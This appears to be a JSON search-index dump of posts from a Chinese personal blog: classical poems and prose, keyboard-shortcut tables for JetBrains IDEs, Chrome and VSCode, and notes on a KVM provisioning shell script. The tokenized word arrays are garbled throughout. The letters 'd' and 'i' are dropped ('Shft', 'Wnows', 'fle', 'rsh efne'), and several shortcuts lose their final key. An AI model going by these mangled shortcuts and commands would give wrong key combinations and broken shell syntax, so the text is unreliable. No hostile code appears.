[{"word":["《","闲情","赋","》","陶渊明","淡","柔情","于","俗","内","，","负","雅志","于高云","。","悲","晨曦","之","易夕","，","感人","生","之","长勤","；","同一","尽","于","百年","，","何欢寡","而","愁殷","！","《","答人","》","太","上","隐者","笙","管","本","无","律","，","清风","顾盼","闲","。","哀哀","稚子","意","，","眷眷","亲人","怜","。","岁月","悲","华发","，","流光","爱","少年","。","山","中","有","历日","，","年","尽","不","言寒","。","幼小","便失亲","，","山深","自","本真","。","几","行","逝水","泪","，","一片","朝霞","洇","。","或","有","野村梦","，","岂","无","花蕾","心","？","春夏秋冬","后","，","情仇","过眼","云","。","《","西江","月","·","平山","堂","》","苏轼","三","过","平山","堂","下","，","半生","弹指","声","中","。","十年","不","见老","仙翁","。","壁上","龙蛇飞动","。","欲吊","文章","太守","，","仍","歌","杨柳","春风","。","休言","万事","转头","空","。","未","转头","时皆梦","。","《","阁夜","》","杜甫","岁暮","阴阳","催","短","景","，","天涯","霜雪","霁寒宵","。","五更","鼓角","声","悲壮","，","三峡","星河","影","动摇","。","野哭","几","家","闻","战伐","，","夷歌","数","处","起","渔樵","。","卧龙","跃马","终","黄土","，","人事","音书漫","寂寥","。","《","采","桑子","》","王国维","高城","鼓动","兰","釭灺","。","睡","也","还","醒","，","醉","也","还","醒","：","忽","听","孤鸿","三两","声","。","人生","只","似风","前","絮","。","欢","也","零星","，","悲","也","零星","，","都","作","连江","点点","萍","。","《","临江","仙","·","夜","归","临皋","》","苏轼","夜饮","东坡","醒复醉","，","归来","仿佛","三更","。","家童","鼻息","已","雷鸣","。","敲门","都","不","应","，","倚杖","听","江声","。","长","恨","此","身","非我","有","，","何时","忘却","营营","？","夜阑","风静縠纹平","。","小舟","从此","逝","，","江海","寄馀生","。","《","浪淘沙","·","北戴河","》","毛泽东","大雨","落幽燕","，","白浪滔天","，","秦皇岛","外","打鱼","船","，","一片汪洋","都","不见","。","知","向","谁边","？","往事","越","千年","，","魏武","挥鞭","，","东临","碣石","有","遗篇","。","萧瑟","秋风","今","又","是","，","换","了","人间","。","《","临江","仙","》","杨慎","滚滚","长","江东","逝水","，","浪花","淘","尽","英雄","。","是非","成败","转头","空","。","青山","依旧","在","，","几度","夕阳红","。","白发","渔樵江渚","上","，","惯","看","秋月春风","。","一壶","浊酒","喜","相逢","。","古今","多少","事","，","都","付","笑谈","中","。","《","摸鱼","儿","·","雁丘","词","》","元","好","问","问","世间","，","情","为","何物","，","直","教","生死","相许","？","天南地北","双飞","客","，","老","翅","几","回","寒暑","。","欢乐","趣","，","离别","苦","，","就","中","更","有","痴","儿女","。","君","应有","语","：","渺","万","里","层云","，","千","山暮雪","，","只","影","向","谁","去","？","横汾路","，","寂寞","当年","箫鼓","，","荒烟","依旧","平楚","。","招魂","楚些","何嗟","及","，","山鬼暗啼","风雨","。","天","也","妒","，","未","信","与","，","莺儿","燕子","俱","黄土","。","千秋万古","，","为","留待","骚人","，","狂歌","痛饮","，","来访","雁丘处","。","《","七律","·","登","庐山","》","毛泽东","一","山飞峙","大","江边","，","跃上","葱茏","四百","旋","。","冷眼","向洋","看","世界","，","热","风吹","雨洒","江天","。","云横","九","派","浮","黄鹤","，","浪","下","三吴","起","白烟","。","陶令","不知","何处","去","，","桃花源","里","可","耕田","。","《","泛海","》","王守仁","险夷","原","不","滞","胸中","，","何异","浮云","过","太空","?","夜","静海","涛","三万","里","，","月","明飞锡","下","天风","。","公元","1506年","（","明武宗","正德","元年","）","，","王守仁","因","仗义执言","被","贬","为","贵州","龙场","驿驿丞","。","刘瑾","还","派人","对","他","进行","暗杀","。","王守仁","急中生智","，","做出","投江","自杀","的","假象","，","搭","上了","前往","福建","的","商船","。","不料","，","当","他","坐船","行","于","海上","，","却","遇上","大","风暴","。","王守仁","此时","却","毫不","畏惧地","坐在","船上","，","写下","了","这","首","著名的","《","泛海","》","。","《","献钱","尚","父","》","贯休","贵","逼人","来","不自由","，","龙骧凤翥势","难","收","。","满堂","花醉","三千","客","，","一","剑霜寒","十四","州","。","鼓角","揭天嘉","气冷","，","风涛","动","地","海山","秋","。","东南","永","作","金天柱","，","谁羡","当时","万户侯","。","《","临安","春雨","初霁","》","陆游","世味","年来","薄似纱","，","谁","令","骑马","客","京华","。","小","楼","一","夜","听","春雨","，","深巷","明朝","卖","杏花","。","矮纸斜行闲","作","草","，","晴窗细乳戏","分","茶","。","素衣莫","起","风尘","叹","，","犹","及","清明","可","到家","。","—","—","《","浮生六记","·","养生","记道","》","摘录","​","世事","茫茫",",","光明","有限",",","算","来","何必","奔忙","!","人生","碌碌",",","竞","短","论","长",",","却","不","道","荣枯","有数",",","得失","难","量","。","看","那","秋风","金谷",",","夜","月","乌江",",","阿房宫","冷",",","铜雀","台","荒","。","荣华","花","上","露",",","富贵","草","头","霜","。","机关","参透","万虑皆忘","。","夸","什么","龙楼凤阁",",","说","什么","利锁名缰","。","闲","来","静处",",","且","将","诗酒","猖狂","。","唱","一","曲","归来","未","晚",",","歌","一","调湖海","茫茫","。","逢时遇景",",","翠寻芳","。","约","几个","知心","密友",",","到","野外","溪","旁",",","或","琴棋适性",",","或","曲水流觞",";","或","说","些善","因","果报",",","或","论些今","古","兴亡",";","看","花枝","雄","锦绣",",","听","鸟","语","弄笙簧","。","一任","他","人情","反复",",","世态炎凉",",","优游","闲","岁月",",","潇洒","度","时光","。","《","四句","义","》","王阳明","无","善","无","恶心","之","体","，","有","善","有","恶意","之","动","。","知善知","恶","是","良知","，","为","善","去","恶","是","格物","。"],"url":"http://ymlog.cn/2020/12/30/%E6%84%BF%E6%9C%89%E6%B6%93%E6%B6%93%E8%AF%97%E6%84%8F%E6%B8%85%E6%96%B0%E5%85%A5%E8%84%BE%EF%BC%8C%E4%BB%A5%E9%A3%A8%E5%BF%99%E7%A2%8C%E7%9A%84%E6%97%A5%E5%B8%B8/","title":"愿有涓涓诗意清新入脾，以飨忙碌的日常","content":"《闲情赋》\n陶渊明\n淡柔情于俗内，负雅志于高云。\n悲晨曦之易夕，感人生之长勤；\n同一尽于百年，何欢寡而愁殷！\n\n\n\n《答人》\n    太上隐者\n笙管本无律，清风顾盼闲。\n哀哀稚子意，眷眷亲人怜。\n岁月悲华发，流光爱少年。\n山中有历日，...","author":"ZEN","categorie":{},"date":"2020-12-30 00:00:00"},{"word":["转","自","：","https",":","segmentfault",".","coma","1190000007206543","编辑","快捷键","组合","说明","Ctrl","+","Space","代码","自动","完成","提示","（","选择","）","Alt","+","Enter","显示","意图","动作","和","快速","修复","Ctrl","+","P","参数","信息","（","在","调用","方法","参数","忘记","的","时候","，","提示","）","Ctrl","+","Q","快速","查找","文件","，","可以","查找","当前","类","定义","的","文件","等","Ctrl","+","鼠标","滑过","基本信息","Alt","+","Insert","生成","代码","…","(","细节","需要","多次","操作","会","发现","很","有意思",")","Ctrl","+","O","重","写","方法","（","在","PHPStorm","中","是","重","写","父类","方法","，","会","有","选择","框","）","Ctrl","+","I","实现","方法","（","一般","是","指","实现","接口","类","或","抽象","类","方法","）","Ctrl","+","Alt","+","T","环绕","代码","块","(","f",".",".","else",",","try",".",".","catch",",","for",",","等",")","Ctrl","+","单行","注释","(",")","Ctrl","+","Shft","+","块","注释","(","*","*",")","Ctrl","+","W","选择","依次","递增","的","代码","块","，","具体","使用","目前","来看","比较","少","Ctrl","+","Shft","+","W","去掉","当前","选择","返回","上一个","选择","，","类似于","撤销","选择","，","与","上面","的","相反","Ctrl","+","Alt","+","L","格式化","代码","，","一般来说","，","写","的","代码","格式","不整齐","统一","，","这个","很","有用","Ctrl","+","Alt","+","I","自","啮合","线","，","这个","解释","不太好","解释","，","测试","结果","就是","会","自动","根据","代码","来","进行","对齐","Ctrl","+","D","复制","当","前行","或","选定","的","块","Ctrl","+","Y","删除","插入","符号","所","在行","Ctrl","+","Shft","+","J","智能","线","连接","（","HTML","和","JaaScrpt","才","有用","）","Ctrl","+","Enter","智能","分割","线","(","HTML","和","JaaScrpt","才","有用",")","Shft","+","Enter","开始","新","行","，","比如","光标","在","当","前行","，","不需要","切换","到","行尾","按","Enter","，","直接","按","这个","组合","键","即可","Ctrl","+","Shft","+","U","切换","选中","的","英文","文字","的","大小写","，","此","处","其","实用","到","挺多","的","Ctrl","+","Shft","+","]","或","[","选择","直到","代码","块","的","开始","或","结束","，","我","之前","不知道","这个","，","其实","很","有用","Ctrl","+","Delete","删除","从","当前","光标","到","当前","单词","结尾","Ctrl","+","Backspace","从","光标","位置","删除","到","当前","单词","的","开始","Ctrl","+","+","或","-","这里","是","ctrl","和","加号","或者","减号","产生","的","组合","，","可以","折叠","或","展开","当前","代码","块","Ctrl","+","F","4","关闭","活动","中的","tab","Ctrl","+","Shft","+","V","从","历史","粘贴","调试","此","处","我是","用","得","很少","快捷键","组合","说明","F","8","跳过","F","7","步进","Shft","+","F","8","跳出","Alt","+","F","8","表达式","求值","F","9","恢复","程序","Ctrl","+","F","8","切断","断点","Ctrl","+","Shft","+","F","8","查看","断点","运行","快捷键","组合","说明","Shft","+","F","10","运行","Shft","+","F","9","调试","Ctrl","+","Shft","+","F","10","从","编辑器","运行","上下文","配置","（","Run","context","confguraton","from","etor","）","，","此","处","可能","翻译","不够","准确","Ctrl","+","Shft","+","X","在","命令行","运行","搜索","替换","快捷键","组合","说明","Ctrl","+","FR","查找","替换","F","3","Shft","+","F","3","查找","下一个上一个","Ctrl","+","Shft","+","FR","在","目录","中","查找","替换","查找","哪些","地方","使用","快捷键","组合","说明","Alt","+","F","7","Ctrl","+","F","7","当前","文件","查找","被","使用","在","文件","中","查找","哪些","地方","使用","Ctrl","+","Shft","+","F","7","文件","中","搜索","并","在","使用","的","地方","高亮","显示","Ctrl","+","Alt","+","F","7","显示","哪些","地方","被","使用","导航","快捷键","组合","说明","Ctrl","+","N","跳转","到","指定","类","Ctrl","+","Shft","+","N","跳转","到","文件","Ctrl","+","Alt","+","Shft","+","N","跳转","到","符号","Ctrl","+","G","跳转","到","第","几","行","Alt","+","RghtLeft","切换","编辑器","活动","窗","Esc","Go","to","etor","(","from","tool","wnow",")","Ctrl","+","E","弹出","最近","编辑","文件","，","我","也是","在","写","这","文档","才","知道","，","太","方便了","Ctrl","+","Alt","+","LeftRght","导航","前进","后退","Ctrl","+","Shft","+","Backspace","跳转","到","最近","编辑","的","代码","位置","Alt","+","F","1","在任","何","视图","中","选择","当前","文件","或","符号","Ctrl","+","B","或","Ctrl","+","Clck","跳","到","申明","（","如","跳转","到","当前","函数","声明","的","地方","，","这个","很","常用","，","可以","实","操","一下","）","Ctrl","+","Alt","+","B","与","上","面相","反","，","跳","到","执行","位置","Ctrl","+","Shft","+","I","打开","快速","定义","查找","Ctrl","+","Shft","+","B","跳转","到","类型","声明","Ctrl","+","U","跳","到","超级","方法","(","super","-","metho",")","超","类","(","super","-","class",")","Alt","+","UpDown","跳转","到","上一个","或者","下一个","方法","，","在编","辑","一个","类","的","时候","，","方便","一个一个","的","方法","进行","查看","Ctrl","+","]","[","跳转","到","代码","块","的","开始","或","结束","F","2","Shft","+","F","2","跳转","到","上一个","或","下一个","高亮","错误","地方","，","这个","检查","代码","语法错误","很","有用","F","4","Ctrl","+","Enter","编辑","源代码","查看","源代码","常用","操作","快捷键","组合","说明","快速","按","两次","Shft","搜索","任何","一个","地方","Ctrl","+","Shft","+","A","查找","方法","(","Acton",")","Alt","+","#","[","0","-","9","]","打开","相应","的","工具","窗口","（","这个","我","也","没","搞","明白","）","Ctrl","+","Alt","+","F","11","开启","或","关闭","全屏","模式","Ctrl","+","Shft","+","F","12","开启","或","关闭","最大化","编辑","Alt","+","Shft","+","F","添加","到","收藏","列表","（","我","觉得","这个","功能","很","神奇","，","不知道","为啥","要","这么","做","）","Alt","+","Shft","+","I","检查","当前","文件","以及","当前","配置","文件","Ctrl","+","Alt","+","S","打开","设置","对话框","（","表示","会","与","QQ","默认","快捷键","冲突","）","Ctrl","+","Tab","在","tabs","和","工具","窗口","间","切换"],"url":"http://ymlog.cn/2020/06/16/Jetbrains%E5%BF%AB%E6%8D%B7%E9%94%AE/","title":"Jetbrains快捷键","content":"转自： https://segmentfault.com/a/1190000007206543\n编辑\n\n\n\n快捷键组合\n说明\n\n\n\nCtrl + Space\n代码自动完成提示（选择）\n\n\nAlt + Enter\n显示意图动作和快速修复...","author":"ZEN","categorie":{},"date":"2020-06-16 11:23:57"},{"word":["转","自","：","https",":","www",".","runoob",".","comw","3","cnotegoogle","-","chrome","-","shortcuts",".","html","Wnows","和","Lnux","版本","的","chrome","标签","页","和","窗口","快捷键","操作","快捷键","打开","新","窗口","Ctrl","+","n","在","隐身","模式","下","打开","新窗口","Ctrl","+","Shft","+","n","打开","新的","标签","页","，","并","跳转","到","该","标签","页","Ctrl","+","t","重新","打开","最后","关闭","的","标签","页","，","并","跳转","到","该","标签","页","Ctrl","+","Shft","+","t","跳转","到","下一个","打开","的","标签","页","Ctrl","+","Tab","或","Ctrl","+","PgDn","跳转","到","上一个","打开","的","标签","页","Ctrl","+","Shft","+","Tab","或","Ctrl","+","PgUp","跳转","到","特定","标签","页","Ctrl","+","1","到","Ctrl","+","8","跳转","到","最后","一个","标签","页","Ctrl","+","9","在","当前","标签","页","中","打开","主页","Alt","+","Home","关闭","当前","标签","页","Ctrl","+","w","或","Ctrl","+","F","4","关闭","所有","打开","的","标签","页","和","浏览器","Ctrl","+","Shft","+","w","最小化","当前","窗口","Alt","+","空格键","+","n","最大化","当前","窗口","Alt","+","空格键","+","x","退出","Google","Chrome","Ctrl","+","Shft","+","q","或","Alt","+","F","4","chrome","功能","快捷键","操作","快捷键","打开","”","菜单","”","Alt","+","f","、","Alt","+","e","或","F","10","显示","或","隐藏","书签","栏","Ctrl","+","Shft","+","b","打开","书签","管理器","Ctrl","+","Shft","+","o","在","新","标签","页","中","打开","”","历史","记录","”","页","Ctrl","+","h","在","新","标签","页","中","打开","”","下载","内容","”","页","Ctrl","+","j","打开","Chrome","任务","管理器","Shft","+","Esc","将","焦点","放置","在","Chrome","工具栏","中","的","第","一项","上","Shft","+","Alt","+","t","在","地址栏","、","书签","栏","（","若","显示","）","和","页面","内容","之间","向前","切换","焦点","F","6","在","地址栏","、","书签","栏","（","若","显示","）","和","页面","内容","之间","向后","切换","焦点","Shft","+","F","6","打开","查找","栏","搜索","当前","网页","Ctrl","+","f","或","F","3","跳转","到","与","查找","栏","中","搜索","字词","相","匹配","的","下","一条","内容","Ctrl","+","g","跳转","到","与","查找","栏","中","搜索","字词","相","匹配","的","上","一条","内容","Ctrl","+","Shft","+","g","打开","”","开发者","工具","”","Ctrl","+","Shft","+","j","或","F","12","打开","”","清除","浏览","数据","”","选项","Ctrl","+","Shft","+","Delete","在","新","标签","页","中","打开","Chrome","帮助","中心","F","1","使用","其他","帐户","登录","或","进入","隐身","模式","Ctrl","+","Shft","+","m","打开","反馈","表单","Ctrl","+","Shft","+","地址栏","快捷键","操作","快捷键","使用","默认","搜索","引擎","进行","搜索","输入","搜索","字词","并","按","Enter","键","使用","其他","搜索","引擎","进行","搜索","输入","搜索","引擎","名称","并","按","Tab","键","为","网站","名称","添加","www",".","和",".","com","，","并","在","当前","标签","页","中","打开","该","网站","输入","网站","名称","并","按","Ctrl","+","Enter","键","为","网站","名称","添加","www",".","和",".","com","，","并","在","新","标签","页","中","打开","该","网站","输入","网站","名称","并","按","Alt","+","Enter","键","跳转","到","地址栏","Ctrl","+","l","、","Alt","+","或","F","6","从","页面","中的","任意","位置","搜索","Ctrl","+","k","或","Ctrl","+","e","网页","快捷键","操作","快捷键","打开","选项","以","打印","当前","网页","Ctrl","+","p","打开","选项","以","保存","当前","网页","Ctrl","+","s","重新","加载","当前","网页","F","5","或","Ctrl","+","r","重新","加载","当前","网页","（","忽略","缓存","的","内容","）","Shft","+","F","5","或","Ctrl","+","Shft","+","r","停止","加载","网页","Esc","浏览","下一个","可","点击","项","Tab","浏览","上一个","可","点击","项","Shft","+","Tab","使用","Chrome","打开","计算机","中","的","文件","按住","Ctrl","+","o","键","并","选择","文件","显示","当前","网页","的","HTML","源代码","（","不可","修改","）","Ctrl","+","u","将","当前","网页","保存","为","书签","Ctrl","+","将","所有","打开","的","标签","页","以","书签","的","形式","保","存在","新","文件夹","中","Ctrl","+","Shft","+","开启","或","关闭","全屏","模式","F","11","放大","网页","上","的","所有","内容","Ctrl","和","+","缩小","网页","上","的","所有","内容","Ctrl","和","-","将","网页","上","的","所有","内容","恢复","到","默认","大小","Ctrl","+","0","向下","滚动","网页","，","一次","一个","屏幕","空格键","或","PgDn","向上","滚动","网页","，","一次","一个","屏幕","Shft","+","空格键","或","PgUp","转到","网页","顶部","首页","转到","网页","底部","末尾","在","网页","上","水平","滚动","按住","Shft","键","并","滚动","鼠标","滚轮","将","光标","移到","文本","字段","中的","上一个","字词","前面","Ctrl","+","向左","箭头","键","将","光标","移到","文本","字段","中的","上一个","字词","后面","Ctrl","+","向右","箭头","键","删除","文本","字段","中的","上一个","字词","Ctrl","+","Backspace","将","焦点","移到","通知","上","Alt","+","n","在","通知","中","允许","Alt","+","Shft","+","a","在","通知","中","拒绝","Alt","+","Shft","+","在","当前","标签","页","中","打开","主页","Alt","+","Home","网页","快捷键","操作","快捷键","在","当前","标签","页","中","打开","链接","（","仅","限","鼠标","）","将","链接","拖","到","标签","页","中","在","新的","后台","标签","页","中","打开","链接","按住","Ctrl","键","的","同时","点击","链接","打开","链接","，","并","跳转","到","该","链接","按住","Ctrl","+","Shft","键","的","同时","点击","链接","打开","链接","，","并","跳转","到","该","链接","（","仅","使用","鼠标","）","将","链接","拖","到","标签","栏","的","空白","区域","在","新窗口","中","打开","链接","按住","Shft","键","的","同时","点击","链接","在","新窗口","中","打开","标签","页","（","仅","使用","鼠标","）","将","标签","页","拖出","标签","栏","将","标签","页","移至","当前","窗口","（","仅","限","鼠标","）","将","标签","页拖","到","现有","窗口","中","将","标签","页移回","其","原始","位置","拖动","标签","页","的","同时","按","Esc","将","当前","网页","保存","为","书签","将","相应","网址","拖动","到","书签","栏","中","下载","链接","目标","按住","Alt","键","的","同时","点击","链接","显示","浏览","记录","右键","点击","”","后退","”","箭头","返回","或","”","前进","”","箭头","下一个","，","或者","点击","并","按住","”","后退","”","箭头","返回","或","”","前进","”","箭头","下一个","最大化","或","最小化","窗口","双击","标签","栏","的","空白","区域","放大","网页","上","的","所有","内容","按住","Ctrl","键","的","同时","向上","滚动","鼠标","滚轮","缩小","网页","上","的","所有","内容","按住","Ctrl","键","的","同时","向下","滚动","鼠标","滚轮","Mac","系统","标签","页","和","窗口","快捷键","操作","快捷键","打开","新","窗口","⌘","+","n","在","无","痕","模式","下","打开","新窗口","⌘","+","Shft","+","n","打开","新的","标签","页","，","并","跳转","到","该","标签","页","⌘","+","t","重新","打开","最后","关闭","的","标签","页","，","并","跳转","到","该","标签","页","⌘","+","Shft","+","t","跳转","到","下一个","打开","的","标签","页","⌘","+","Opton","+","向右","箭头","键","跳转","到","上一个","打开","的","标签","页","⌘","+","Opton","+","向左","箭头","键","跳转","到","特定","标签","页","⌘","+","1","到","⌘","+","8","跳转","到","最后","一个","标签","页","⌘","+","9","打开","当前","标签","页","浏览","记录","中","记录","的","上一个","页面","⌘","+","[","或","⌘","+","向左","箭头","键","打开","当前","标签","页","浏览","记录","中","记录","的","下一个","页面","⌘","+","]","或","⌘","+","向右","箭头","键","关闭","当前","标签","页","或","弹出式","窗口","⌘","+","w","关闭","当前","窗口","⌘","+","Shft","+","w","最小化","窗口","⌘","+","m","隐藏","Google","Chrome","⌘","+","h","退出","Google","Chrome","⌘","+","q","Google","Chrome","功能","快捷键","操作","快捷键","显示","或","隐藏","书签","栏","⌘","+","Shft","+","b","打开","书签","管理器","⌘","+","Opton","+","b","在","新","标签","页","中","打开","”","设置","”","页","⌘","+",",","在","新","标签","页","中","打开","”","历史","记录","”","页","⌘","+","y","在","新","标签","页","中","打开","”","下载","内容","”","页","⌘","+","Shft","+","j","打开","查找","栏","搜索","当前","网页","⌘","+","f","跳转","到","与","查找","栏","中","搜索","字词","相","匹配","的","下","一条","内容","⌘","+","g","跳转","到","与","查找","栏","中","搜索","字词","相","匹配","的","上","一条","内容","⌘","+","Shft","+","g","打开","查找","栏","后","，","搜索","选定","文本","⌘","+","e","打开","”","开发者","工具","”","⌘","+","Opton","+","打开","”","清除","浏览","数据","”","选项","⌘","+","Shft","+","Delete","使用","其他","帐号","登录","或","以","访客","身份","浏览","⌘","+","Shft","+","m","地址栏","快捷键","操作","快捷键","使用","默认","搜索","引擎","进行","搜索","输入","搜索","字词","并","按","Enter","键","使用","其他","搜索","引擎","进行","搜索","输入","搜索","引擎","名称","并","按","Tab","键","为","网站","名称","添加","www",".","和",".","com","，","并","在","当前","标签","页","中","打开","该","网站","输入","网站","名称","并","按","Control","+","Enter","键","为","网站","名称","添加","www",".","和",".","com","，","并","在","新","标签","页","中","打开","该","网站","输入","网站","名称","并","按","Control","+","Shft","+","Enter","键","在","新的","后台","标签","页","中","打开","网站","输入","网址","并","按","⌘","+","Enter","键","跳转","到","地址栏","⌘","+","l","从","地址栏","中","移","除","联想","查询","内容","按","向下","箭头","键","以","突出","显示","相应","内容","，","然后","按","Shft","+","fn","+","Delete","网页","快捷键","操作","快捷键","打开","选项","以","打印","当前","网页","⌘","+","p","打开","选项","以","保存","当前","网页","⌘","+","s","打开","”","页面","设置","”","对话框","⌘","+","Opton","+","p","通过","电子邮件","发送","当前","网页","⌘","+","Shft","+","重新","加载","当前","网页","⌘","+","r","重新","加载","当前","网页","（","忽略","缓存","的","内容","）","⌘","+","Shft","+","r","停止","加载","网页","Esc","浏览","下一个","可","点击","项","Tab","浏览","上一个","可","点击","项","Shft","+","Tab","使用","Google","Chrome","打开","计算机","中","的","文件","按住","⌘","+","o","键","并","选择","文件","显示","当前","网页","的","HTML","源代码","（","不可","修改","）","⌘","+","Opton","+","u","打开","JaaScrpt","控制台","⌘","+","Opton","+","j","将","当前","网页","保存","为","书签","⌘","+","将","所有","打开","的","标签","页","以","书签","的","形式","保","存在","新","文件夹","中","⌘","+","Shft","+","开启","或","关闭","全屏","模式","⌘","+","Ctrl","+","f","放大","网页","上","的","所有","内容","⌘","和","+","缩小","网页","上","的","所有","内容","⌘","和","-","将","网页","上","的","所有","内容","恢复","到","默认","大小","⌘","+","0","向下","滚动","网页","，","一次","一个","屏幕","空格键","向上","滚动","网页","，","一次","一个","屏幕","Shft","+","空格键","搜索","网络","⌘","+","Opton","+","f","将","光标","移到","文本","字段","中的","上一个","字词","前面","Opton","+","向左","箭头","键","将","光标","移到","文本","字段","中的","上一个","字词","后面","Opton","+","向右","箭头","键","删除","文本","字段","中的","上一个","字词","Opton","+","Delete","在","当前","标签","页","中","打开","主页","⌘","+","Shft","+","h","鼠标","快捷键","操作","快捷键","在","当前","标签","页","中","打开","链接","（","仅","限","鼠标","）","将","链接","拖","到","标签","页","中","在","新的","后台","标签","页","中","打开","链接","按住","⌘","键","的","同时","点击","链接","打开","链接","，","并","跳转","到","该","链接","按住","⌘","+","Shft","键","的","同时","点击","链接","打开","链接","，","并","跳转","到","该","链接","（","仅","使用","鼠标","）","将","链接","拖","到","标签","栏","的","空白","区域","在","新窗口","中","打开","链接","按住","Shft","键","的","同时","点击","链接","在","新窗口","中","打开","标签","页","（","仅","使用","鼠标","）","将","标签","页","拖出","标签","栏","将","标签","页","移至","当前","窗口","（","仅","限","鼠标","）","将","标签","页拖","到","现有","窗口","中","将","标签","页移回","其","原始","位置","拖动","标签","页","的","同时","按","Esc","将","当前","网页","保存","为","书签","将","相应","网址","拖动","到","书签","栏","中","下载","链接","目标","按住","Opton","键","的","同时","点击","链接","显示","浏览","记录","右键","点击","”","后退","”","箭头","或","”","前进","”","箭头","，","或者","左","键","点击","（","并","按住","鼠标","左","键","不","放","）","”","后退","”","箭头","或","”","前进","”","箭头","将","窗口","高度","最大化","双击","标签","栏","的","空白","区域"],"url":"http://ymlog.cn/2020/06/16/Chrome%E5%BF%AB%E6%8D%B7%E9%94%AE/","title":"Chrome快捷键","content":"转自：https://www.runoob.com/w3cnote/google-chrome-shortcuts.html\nWindows 和 Linux版本的chrome标签页和窗口快捷键\n\n\n操作\n快捷键\n\n\n\n打开新窗口\nCt...","author":"ZEN","categorie":{},"date":"2020-06-16 11:23:27"},{"word":["常用的","几个","shortcut","nfo","Ctrl","+","Shft","+","K","删除","当","前行","Ctrl","+","L","选中","当","前行","Ctrl","+","letf",",","Ctrl","+","Rght","逐个","单词","跳转","Ctrl","+","B","打开","左侧","页面","Ctrl","+","J","打开","终端","Ctrl","+","F","搜索","Ctrl","+","D","查找","当下","字符","，","可以","跳转","Fn","+","Up",",","Fn","+","Down","翻","半页","Ctrl","+","Backspace","删除","一个","单词","Shft","+","Alt","+","Down","复制","一行","Ctrl","+","]",",","Ctrl","+","[","缩进","tab","和","退","缩进","Ctrl","+","Shft","+","W","关闭","编辑器","Ctrl","+","W","关闭","当前","编辑","文本","Ctrl","+","Enter","在","当","前行","下","插入","新的","一行","Ctrl","+","Shft","+","匹配","括号","跳转","Ctrl","+","upown","行","视图","上下","偏移","Ctrl","+","P","跳转","文件","Alt","+","Clck","插入","光标","-","支","持","多","个","Ctrl","+","=","-","放大","缩小","Ctrl","+","Shft","+","V","复制","到","当前","激活","的","终端","Ctrl","+","`","打开","集成","终端","Ctrl","+","Shft","+","`","创建","一个","新的","终端","为","tab","设置","颜色","安装","Materal","Theme","插","件","Ctrl","+","Shft","+","P","，","选择","Materal","Theme","：","set","accent","color","选择","喜欢","颜色","查看","运行","插件","Ctrl","+","Shft","+","P","；","输入","show","runnng","extensons","查看","所有","运行","插件","更多","快捷键","：","https",":","blog",".","csn",".","netcrperartcleetals","54099319"],"url":"http://ymlog.cn/2020/06/16/VsCode%E5%BF%AB%E6%8D%B7%E9%94%AE/","title":"VSCode快捷键","content":"常用的几个\n\n\n\nshortcut\ninfo\n\n\n\nCtrl+Shift+K\n删除当前行\n\n\nCtrl+L\n选中当前行\n\n\nCtrl+letf, Ctrl+Right\n逐个单词跳转\n\n\nCtrl+B\n打开左侧页面\n\n\nCtrl+J\n打...","author":"ZEN","categorie":{},"date":"2020-06-16 10:51:59"},{"word":["自动化","脚本","提升","运维","效率","大纲","km","创建","虚拟机","的","根本","在于","这样","一条","命令","，","rsh","efne","m","-","template",".","xml","，","这","条","命令","的","核心","就是","创建","一个","虚拟机","，","之后","或者","之前","的","内容","都是","围绕","着","这","条","命令","和","这个","虚拟机","的","。","-","更新","m","-","templatem","模板","是","为了","进行","子","机","资源配置","-","在","更新","模板","之前","检查","时","主机","是","为了","防止","给","子","机","过量","的","资源","导致","母机","不稳定","-","桥接","网卡","是","为了","让","子","机","连接","局域网","所以","，","rsh","efne","m","-","template",".","xml","其","本质","是","在","安全","可靠的","前提","下","，","将","母机","的","资源","通过","km","虚拟","化","的","形式","分","配给","子","机","。","所以","主要","考虑","方向","有","两个","1","、","保障","母机","和","子","机","的","安全","可靠","，","包括","系统安全","和","网络安全","2","、","进行","资源","分配","，","包括","网络资源","、","存储","资源","、","计算","资源","等","该","脚本","考虑","了","母机","分配","资源","不会","超过","母机","承受","范围","的","资源","安全","，","其他","系统","层面","和","网络","层面","的","安全问题","还","需","考虑","命令","-","1","、","se","-","替换","注释","se","-","\"","s","^","IPADDR","#","&","amp",";","\"","fle","-","字段","追加","se","-","\"","DEVICEa","\\","BRIDGE","=","'","br","0","'","\"","fle","-","指定","行","插入","se","-","\"","4","Content","\"","fle","-","注意","\"","\"","和","'","'","的","区别","，","在","使用","变量","时","可以","加","\\","转义","字符","-","2","、","cat","-","cat","EOF","fle","，","这里","的","变量","需要","转义","字符","\\",",","且","EOF","不能","使用","双引号","\"","EOF","\"",",","否则","变量","会","消失","-","3","、","expect","-","expect","执行","顺序","容易","错乱","-","expect","\"","~","\"","&","#","123",";","sen","\"","umount","share","\\","r","\"","&","#","125",";","：","常用","expect","方法","-","如果","执行","expect","需要","等待","很长时间","，","可以","把","tmeout","设置","为","-","1","-","expect","脚本","执行","时","，","不能","使用","sh","scrpt",".","sh","这样","相当于","用","shell","的","解释","器","执行","，","可以","采用",".","scrpt","$","args","-","4","、","whle","-","whle","rea","a","b","c","e",";","o",".",".",".",".",";","one","fle","，","用于","读取","类似","格式","为","192.168.1.1","255.255.255.0","C","之类","的","文本","，","读取","之后","a","b","c","e","均","为","fle","中","对应","的","变量","-","5","、","echo","-","注意","echo","颜色","的","使用","，","红色","闪烁","和","绿色","健康","：","-","e","\"","\\","033","[","31","m","\\","033","[","01","m","\\","033","[","05","m","[","err","]","\\","033","[","0","m","\"","\"","\\","033","[","32","m","[","OK","]","\\","033","[","0","m","\"","-","6","、","bc","-","shell","中","浮点","数","和","整数","、","浮点","数","和","浮点","数","不能","直接","比较","大小","，","可以","使用","bc","工具","-","echo","\"","1.1","1","\"","bc","正确","为","1","错误","为","0","过程","完成","过程","-","1","主机","检查","-","（","磁盘","、","CPU","、","内存","）","写","了","自动","检查","&","amp",";","手动","检查","[","0","]","-","2","网卡","桥接","，","创建","一个","br","0","作","为","网桥","，","连接","eth","1","和","km","虚拟机","-","3","安装","软件","，","执行","tlnux","*",".","run","-","4","重","启","母机","-","5","主机","通信","[","1","]","-","6","创建","子","机","磁盘","，","包括","系统盘","、","数据","盘","、","共享","盘","-","6","配置","模板","，","包括","调整","CPU","个数","、","内存大小","、","lan","、","网卡","、","uu","、","mac","地址","、","子","机","名称","-","7","使用","6","中的","模板","创建","子","机","[","2","]","-","8","登录","子","机","[","3","]","-","9","执行","脚本","，","只要","expect","程序","不错","，","这里","基本","不会","错","[","4","]","[","0","]","刚开始","考虑","当","母机","资源","超过","一定","比例","则","程序","退出","，","比如","磁盘","使用","超过","23","，","后来","觉得","这